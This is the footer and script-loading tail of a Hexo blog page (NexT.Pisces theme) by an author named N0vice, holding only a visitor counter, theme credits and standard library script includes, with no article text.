  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N0vice</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
